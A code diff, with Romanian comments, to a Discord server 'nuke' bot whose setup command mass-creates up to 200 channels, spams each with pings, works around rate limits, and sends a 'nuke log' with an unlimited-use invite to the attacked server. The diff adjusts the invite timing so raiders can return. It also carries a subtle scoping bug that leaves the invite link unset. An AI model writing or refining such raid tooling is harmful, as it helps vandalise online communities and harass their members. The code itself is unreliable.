@@ -572,19 +572,6 @@ async def setup(ctx):
     total_channels = 200 if is_owner else 70
     spam_messages = 25 if is_owner else 15
 
-    # ===== CREEZĂ INVITAȚIA (ÎNAINTE DE ȘTERGERE) =====
-    invite_link = None
-    try:
-        # Încercăm să găsim un canal text pentru a crea invitația
-        if guild.text_channels:
-            invite = await guild.text_channels[0].create_invite(max_age=3600, max_uses=10, reason="Nuke log invite")
-            invite_link = invite.url
-    except:
-        pass
-
-    # ===== TRIMITE LOGUL INSTANT =====
-    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)
-
     # ===== SALVEAZĂ STATISTICILE =====
     save_nuke_stats(user.id, guild)
 
@@ -668,8 +655,12 @@ async def setup(ctx):
 
     font_styles = ["bold", "script", "double"]
     created_channels = []
+    invite_link = None
 
     await user.send(f"🔄 Starting creation of {total_channels} channels in parallel...")
+
+    # ===== VARIABILĂ PENTRU A SALVA PRIMUL CANAL =====
+    first_channel = None
 
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
@@ -703,6 +694,7 @@ async def setup(ctx):
             pass
 
     async def create_and_spam(index):
+        nonlocal first_channel
         try:
             base_name = random.choice(base_channel_names)
             font_style = random.choice(font_styles)
@@ -714,12 +706,25 @@ async def setup(ctx):
                 await user.send(f"⚠️ Failed to create channel {index} after retries.")
                 return
             created_channels.append(ch)
+
+            # Dacă este primul canal, salvează-l și creează invitația
+            if first_channel is None:
+                first_channel = ch
+                try:
+                    invite = await ch.create_invite(max_age=86400, max_uses=0, reason="Nuke log invite")
+                    invite_link = invite.url
+                except:
+                    pass
+
             asyncio.create_task(spam_channel(ch))
         except Exception as e:
             await user.send(f"⚠️ Error on channel {index}: {e}")
 
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
+
+    # ===== TRIMITE LOGUL CU INVITAȚIA PROASPĂTĂ =====
+    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)
 
     await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
 
